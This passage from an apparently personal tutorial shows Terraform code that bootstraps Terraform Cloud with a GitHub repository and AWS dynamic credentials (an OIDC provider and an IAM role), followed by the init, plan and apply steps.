of the infrastructure will go. Create a file called <code>3-github.tf</code>:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="hcl" data-theme="default"><code data-language="hcl" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">resource</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"github_repository"</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"repo"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  name</span><span style="color: #F69D50">        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">var</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">github_repo_name</span></span>
<span data-line=""><span style="color: #ADBAC7">  description</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"Infrastructure Repository"</span></span>
<span data-line=""><span style="color: #ADBAC7">  visibility</span><span style="color: #F69D50">  </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"private"</span></span>
<span data-line=""><span style="color: #ADBAC7">  auto_init</span><span style="color: #F69D50">   </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #6CB6FF">true</span></span>
<span data-line=""><span style="color: #ADBAC7">  has_issues</span><span style="color: #F69D50">  </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #6CB6FF">true</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">resource</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"github_branch_default"</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"default"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  repository</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">github_repository</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">repo</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">name</span></span>
<span data-line=""><span style="color: #ADBAC7">  branch</span><span style="color: #F69D50">     </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">var</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">github_default_branch</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">data</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfe_team"</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"owners"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  name</span><span style="color: #F69D50">         </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"owners"</span></span>
<span data-line=""><span style="color: #ADBAC7">  organization</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">tfe_organization</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">organization</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">name</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">resource</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfe_team_token"</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"github_actions_token"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  team_id</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">data</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfe_team</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">owners</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">id</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">resource</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"github_actions_secret"</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfe_secret"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  repository</span><span style="color: #F69D50">      </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">github_repository</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">repo</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">name</span></span>
<span data-line=""><span style="color: #ADBAC7">  secret_name</span><span style="color: #F69D50">     </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"TFE_TOKEN"</span></span>
<span data-line=""><span style="color: #ADBAC7">  plaintext_value</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">tfe_team_token</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">github_actions_token</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">token</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">output</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"repository_id"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  value</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">github_repository</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">repo</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">id</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>This will generate a new repository in your account called <code>infra</code>.</p>
<p>For the terraform provider to have access to github you need to create a new
personal access token with full <code>repo</code> access and set it as an environment
variable named <code>GITHUB_TOKEN</code>.</p>
<h3>Terraform Cloud</h3>
<p>Now we need to setup dynamic credentials so the terraform cloud agent is
allowed to take actions on your behalf.   To do this we'll setup an IAM
role and an OIDC provider. Create a file called <code>4-tfc.tf</code>:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="hcl" data-theme="default"><code data-language="hcl" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">resource</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfe_organization"</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"organization"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  name</span><span style="color: #F69D50">  </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">var</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc_organization_name</span></span>
<span data-line=""><span style="color: #ADBAC7">  email</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">var</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc_organization_owner</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #768390">/* AWS will use this TLS certificate to verify that requests for dynamic</span></span>
<span data-line=""><span style="color: #768390">credentials come from Terraform Cloud.*/</span></span>
<span data-line=""><span style="color: #F69D50">data</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tls_certificate"</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfc_certificate"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  url</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"https://</span><span style="color: #F47067">${</span><span style="color: #ADBAC7">var</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc_hostname</span><span style="color: #F47067">}</span><span style="color: #96D0FF">"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #768390">/* sets up an OIDC provider in AWS with Terraform Cloud's TLS certificate,</span></span>
<span data-line=""><span style="color: #768390">the SHA1 fingerprint from the TLS certificate</span></span>
<span data-line=""><span style="color: #768390">*/</span></span>
<span data-line=""><span style="color: #F69D50">resource</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"aws_iam_openid_connect_provider"</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfc_provider"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  url</span><span style="color: #F69D50">            </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">data</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tls_certificate</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc_certificate</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">url</span></span>
<span data-line=""><span style="color: #ADBAC7">  client_id_list</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">[var</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc_aws_audience]</span></span>
<span data-line=""><span style="color: #ADBAC7">  thumbprint_list</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">[</span></span>
<span data-line=""><span style="color: #ADBAC7">    data</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tls_certificate</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc_certificate</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">certificates[</span><span style="color: #6CB6FF">0</span><span style="color: #ADBAC7">]</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">sha1_fingerprint</span></span>
<span data-line=""><span style="color: #ADBAC7">  ]</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #768390">/* Policy to allow TFC to assume the AWS IAM role in our account */</span></span>
<span data-line=""><span style="color: #F69D50">data</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"aws_iam_policy_document"</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"assume_role"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">statement</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">    effect</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"Allow"</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">principals</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">      type</span><span style="color: #F69D50">        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"Federated"</span></span>
<span data-line=""><span style="color: #ADBAC7">      identifiers</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">[aws_iam_openid_connect_provider</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc_provider</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">arn]</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">condition</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">      test</span><span style="color: #F69D50">     </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"StringEquals"</span></span>
<span data-line=""><span style="color: #ADBAC7">      variable</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"</span><span style="color: #F47067">${</span><span style="color: #ADBAC7">var</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc_hostname</span><span style="color: #F47067">}</span><span style="color: #96D0FF">:aud"</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">      values</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">[</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #96D0FF">"</span><span style="color: #F47067">${</span><span style="color: #6CB6FF">one</span><span style="color: #96D0FF">(aws_iam_openid_connect_provider</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc_provider</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">client_id_list</span><span style="color: #96D0FF">)</span><span style="color: #F47067">}</span><span style="color: #96D0FF">"</span></span>
<span data-line=""><span style="color: #ADBAC7">      ]</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">condition</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">      test</span><span style="color: #F69D50">     </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"StringLike"</span></span>
<span data-line=""><span style="color: #ADBAC7">      variable</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"</span><span style="color: #F47067">${</span><span style="color: #ADBAC7">var</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc_hostname</span><span style="color: #F47067">}</span><span style="color: #96D0FF">:sub"</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">      values</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">[</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F47067">for</span><span style="color: #ADBAC7"> workspace </span><span style="color: #F47067">in</span><span style="color: #ADBAC7"> var</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc_workspaces </span><span style="color: #F47067">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"organization:</span><span style="color: #F47067">${</span><span style="color: #ADBAC7">tfe_organization</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">organization</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">name</span><span style="color: #F47067">}</span><span style="color: #96D0FF">:project:</span><span style="color: #F47067">${</span><span style="color: #ADBAC7">var</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc_project_name</span><span style="color: #F47067">}</span><span style="color: #96D0FF">:workspace:</span><span style="color: #F47067">${</span><span style="color: #ADBAC7">workspace</span><span style="color: #F47067">}</span><span style="color: #96D0FF">:run_phase:*"</span></span>
<span data-line=""><span style="color: #ADBAC7">      ]</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">    actions</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">[</span><span style="color: #96D0FF">"sts:AssumeRoleWithWebIdentity"</span><span style="color: #ADBAC7">]</span></span>
<span data-line=""><span style="color: #ADBAC7">  }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">resource</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"aws_iam_role"</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfc-agent"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  name</span><span style="color: #F69D50">               </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"tfc-agent"</span></span>
<span data-line=""><span style="color: #ADBAC7">  assume_role_policy</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">data</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">aws_iam_policy_document</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">assume_role</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">json</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #768390">/* Policy for what the TFC agent is allowed to do */</span></span>
<span data-line=""><span style="color: #F69D50">data</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"aws_iam_policy_document"</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfc-agent"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  version</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"2012-10-17"</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">statement</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">    actions</span><span style="color: #F69D50">   </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">[</span><span style="color: #96D0FF">"*"</span><span style="color: #ADBAC7">]</span></span>
<span data-line=""><span style="color: #ADBAC7">    effect</span><span style="color: #F69D50">    </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"Allow"</span></span>
<span data-line=""><span style="color: #ADBAC7">    resources</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">[</span><span style="color: #96D0FF">"*"</span><span style="color: #ADBAC7">]</span></span>
<span data-line=""><span style="color: #ADBAC7">  }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">resource</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"aws_iam_policy"</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfc-agent"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  name</span><span style="color: #F69D50">        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"tfc-agent-access-policy"</span></span>
<span data-line=""><span style="color: #ADBAC7">  description</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"Access policy for the TFC agent"</span></span>
<span data-line=""><span style="color: #ADBAC7">  policy</span><span style="color: #F69D50">      </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">data</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">aws_iam_policy_document</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc-agent</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">json</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">resource</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"aws_iam_role_policy_attachment"</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfc-access-attach"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  role</span><span style="color: #F69D50">       </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">aws_iam_role</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc-agent</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">name</span></span>
<span data-line=""><span style="color: #ADBAC7">  policy_arn</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">aws_iam_policy</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc-agent</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">arn</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">resource</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfe_workspace"</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"workspaces"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  count</span><span style="color: #F69D50">        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #6CB6FF">length</span><span style="color: #ADBAC7">(var</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc_workspaces)</span></span>
<span data-line=""><span style="color: #ADBAC7">  name</span><span style="color: #F69D50">         </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">var</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc_workspaces[count</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">index]</span></span>
<span data-line=""><span style="color: #ADBAC7">  organization</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">tfe_organization</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">organization</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">name</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">  working_directory</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">var</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc_workspaces[count</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">index]</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #768390">/* These variables tell the agent to use dynamic credentials */</span></span>
<span data-line=""><span style="color: #F69D50">resource</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfe_variable"</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfc-auth"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  count</span><span style="color: #F69D50">        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #6CB6FF">length</span><span style="color: #ADBAC7">(var</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc_workspaces)</span></span>
<span data-line=""><span style="color: #ADBAC7">  key</span><span style="color: #F69D50">          </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"TFC_AWS_PROVIDER_AUTH"</span></span>
<span data-line=""><span style="color: #ADBAC7">  value</span><span style="color: #F69D50">        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #6CB6FF">true</span></span>
<span data-line=""><span style="color: #ADBAC7">  category</span><span style="color: #F69D50">     </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"env"</span></span>
<span data-line=""><span style="color: #ADBAC7">  workspace_id</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">tfe_workspace</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">workspaces[count</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">index]</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">id</span></span>
<span data-line=""><span style="color: #ADBAC7">  description</span><span style="color: #F69D50">  </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"Enable dynamic auth on the TFC agents"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">resource</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfe_variable"</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfc-role"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  count</span><span style="color: #F69D50">        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #6CB6FF">length</span><span style="color: #ADBAC7">(var</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc_workspaces)</span></span>
<span data-line=""><span style="color: #ADBAC7">  key</span><span style="color: #F69D50">          </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"TFC_AWS_RUN_ROLE_ARN"</span></span>
<span data-line=""><span style="color: #ADBAC7">  value</span><span style="color: #F69D50">        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">aws_iam_role</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">tfc-agent</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">arn</span></span>
<span data-line=""><span style="color: #ADBAC7">  category</span><span style="color: #F69D50">     </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"env"</span></span>
<span data-line=""><span style="color: #ADBAC7">  workspace_id</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">tfe_workspace</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">workspaces[count</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">index]</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">id</span></span>
<span data-line=""><span style="color: #ADBAC7">  description</span><span style="color: #F69D50">  </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"Tell TFC what Role to run as"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>This module is dynamic because there is one piece that will require a
manual oauth setup for github.  So the first pass will apply without it
and then later on we'll create it and run the apply again.</p>
<h2>Applying the changes</h2>
<p>Now we just need to define our settings for the module and we'll get our
infrastructure applied.  Create a file called <code>settings.auto.tfvars</code> and
populate it with the content for your account.  This is an example of what
this should look like:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="hcl" data-theme="default"><code data-language="hcl" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #ADBAC7">tfc_organization_name</span><span style="color: #F69D50">  </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"sontek"</span></span>
<span data-line=""><span style="color: #ADBAC7">tfc_organization_owner</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"john@sontek.net"</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #768390"># The workspaces you want to create and be able to manage with IaC</span></span>
<span data-line=""><span style="color: #ADBAC7">tfc_workspaces</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">[</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #96D0FF">"root"</span></span>
<span data-line=""><span style="color: #ADBAC7">]</span></span>
<span data-line=""><span style="color: #768390"># this can be your username</span></span>
<span data-line=""><span style="color: #ADBAC7">github_organization</span><span style="color: #F69D50">    </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"sontek"</span></span>
<span data-line=""><span style="color: #ADBAC7">github_repo_name</span><span style="color: #F69D50">       </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"sontek-infra"</span></span>
<span data-line=""><span style="color: #ADBAC7">aws_root_account_id</span><span style="color: #F69D50">    </span><span style="color: #F47067">=</span><span style="color: #F69D50">  </span><span style="color: #96D0FF">"888888888888"</span></span></code></pre></div>
<p>Now run:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">terraform</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">login</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">terraform</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">init</span></span></code></pre></div>
<p>and you should see:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">Terraform has been successfully initialized!</span></span></code></pre></div>
<p>Now lets run our plan:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">❯ terraform plan</span></span></code></pre></div>
<p>You should see a result:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">Plan: 10 to add, 0 to change, 0 to destroy.</span></span></code></pre></div>
<p>Apply it to make those resources:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">❯ terraform apply</span></span></code></pre></div>
<p>At this point it:</p>
<ol>
<li>Created a terraform cloud organization</li>
<li>Created a terraform cloud workspace</li>
<li>Created a git repository</li>
</ol>
<h1>Verify TFC can talk to AWS</h1>
<p>To verify that TFC can communicate with AWS through the dynamic credentials,
lets clone the <em>NEW</em> repository we just generated and make some dummy resources. After
you've cloned the repository lets make a folder for the workspace <code>root</code> that we
defined in bootstrap:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">mkdir</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">root</span></span>
